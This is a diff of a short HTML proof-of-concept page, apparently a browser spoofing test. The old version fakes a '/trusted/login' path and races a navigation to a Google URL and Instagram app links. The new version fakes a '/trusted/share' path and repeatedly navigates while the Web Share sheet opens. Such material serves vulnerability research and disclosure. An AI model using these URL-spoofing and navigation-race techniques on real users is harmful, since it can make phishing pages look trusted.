@@ -1,49 +1,56 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<title>iOS PoC Open Instagram</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta charset="utf-8">
+    <title>Web Share PoC</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+
+    <style>
+        html, body {
+            margin: 0;
+            width: 100vw;
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            user-select: none;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f5f5f7;
+        }
+    </style>
 </head>
 
 <body>
-<center>
-  <button id="start">Start</button>
-  <div id="panel" style="display:none">Loading…</div>
-</center>
+    <h1>Tap anywhere to share</h1>
 
 <script>
-/* Step 1: Fake trusted path */
-document.getElementById('start').onclick = () => {
-  history.pushState({}, '', '/trusted/login');
-  panel.style.display = 'block';
+const shareData = {
+    title: "Web Share Test",
+    text: "Testing Web Share API behavior during navigation.",
+    url: "https://example.com"
 };
 
-/* Step 2: Navigation race (TARGET DI AKHIR) */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090/#https://google.com:9090';
-      }, 80);
-    });
-  });
-});
-</script>
+document.body.addEventListener('click', async () => {
 
-<!-- TAMBAHAN TANPA MENYENTUH SNIPPET -->
-<script>
-/* Step 3: iOS app open (Instagram) */
-window.addEventListener('pagehide', () => {
-    // Universal Link
-    setTimeout(() => {
-        location.href = 'https://www.instagram.com/instagram/';
-    }, 50);
+    // Step 1: Fake trusted path (optional but realistic)
+    history.pushState({}, '', '/trusted/share');
 
-    // Scheme fallback
-    setTimeout(() => {
-        location.href = 'instagram://user?username=instagram';
-    }, 120);
+    // Step 2: Start navigation race while share sheet is opening
+    let race = setInterval(() => {
+        location.href = "https://www.google.com";
+    }, 300);
+
+    try {
+        await navigator.share(shareData);
+    } catch (e) {
+        // user cancelled share
+    }
+
+    // Step 3: Stop race after interaction
+    clearInterval(race);
 });
 </script>
 
